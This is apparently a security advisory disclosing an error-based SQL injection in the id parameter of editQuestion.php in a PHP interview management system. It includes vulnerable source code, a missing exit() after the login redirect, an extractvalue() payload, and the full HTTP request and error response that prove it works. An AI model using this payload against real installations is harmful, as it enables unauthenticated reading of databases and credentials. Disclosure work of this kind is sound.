## INTERVIEW_MANAGEMENT_SYSTEM editQuestion.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `id` parameter of `editQuestion.php` is concatenated into the SQL statement without any type casting or filtering, allowing an attacker to inject arbitrary SQL expressions. By using the `extractvalue()` function, the attacker can force MySQL to return the result of an arbitrary subquery inside an error message and read it directly from the HTTP response. This makes it possible to dump the database schema, account credentials and any other table content without authentication.

### II. Source Code Analysis

The vulnerability resides in `inc/classes/View.php`, lines 35-36:

```php
function viewEditQuestions(){
  //view all candidates
  $questionId = $_GET['id'];
  $sql = "select * from questions where question_id = $questionId";
  $query = $this->db->simplequerywithoutcondition($sql);
```

The method is called from `editQuestion.php`, line 14:

```php
$viewQuestions = $view->viewEditQuestions();
```

`$_GET['id']` is assigned to `$questionId` and concatenated directly into the `WHERE question_id = $questionId` clause. There is no `intval()`, no quoting and no whitelist check on the value, so the parameter leaves the numeric context and becomes part of the executed SQL text. `simplequerywithoutcondition()` does call `PDO::prepare()`, but the statement is prepared without any bound parameter, therefore the whole injected string is compiled as SQL instead of being treated as data. Since `question_id` is compared against a numeric value, no quote character is required to break out: a bare function call such as `extractvalue(...)` is a valid scalar expression.

The same file also fails to stop execution after the authentication check (`editQuestion.php`, lines 7-9): when the `login` session value is missing, `header('Location: login.php')` is called but no `exit()` follows, so `viewEditQuestions()` is still executed and the injection remains reachable without a valid session.

### III. Payload

The core injection payload is:

```
extractvalue(1,concat(char(126),md5(1755373322)))
```

The resulting SQL statement executed by the server becomes:

```sql
select * from questions where question_id = extractvalue(1,concat(char(126),md5(1755373322)))
```

`char(126)` prepends a `~` marker to the extracted value, and `extractvalue()` refuses the malformed XPath expression and echoes the evaluated argument back in the error message, which is what leaks the data.

```
POST /editQuestion.php?id=extractvalue(1,concat(char(126),md5(1755373322))) HTTP/1.1
Host: interview
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://interview
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://interview/editQuestion.php?id=9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=i2jj38602vva31ljqbjfsg91l3
Connection: keep-alive

question=11&editQuestion=Submit
```

The server answers with a fatal error containing the evaluated MD5 value, proving that the injected expression was executed by the database:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.3.4
Content-Length: 597

<br />
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~39b80d10ff80dc8acd13e254c482067' in E:\phpstudy_pro\WWW\interview\inc\classes\DB.php:31
Stack trace:
#0 E:\phpstudy_pro\WWW\interview\inc\classes\DB.php(31): PDOStatement->execute()
#1 E:\phpstudy_pro\WWW\interview\inc\classes\View.php(37): DB->simplequerywithoutcondition('select * from q...')
#2 E:\phpstudy_pro\WWW\interview\editQuestion.php(14): View->viewEditQuestions()
#3 {main}
thrown in <b>E:\phpstudy_pro\WWW\interview\inc\classes\DB.php</b> on line <b>31</b><br />
```

### IV. Source Download

https://code-projects.org/interview-management-system-in-php-with-source-code/



![image-20261030153626257](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030153626257.png)
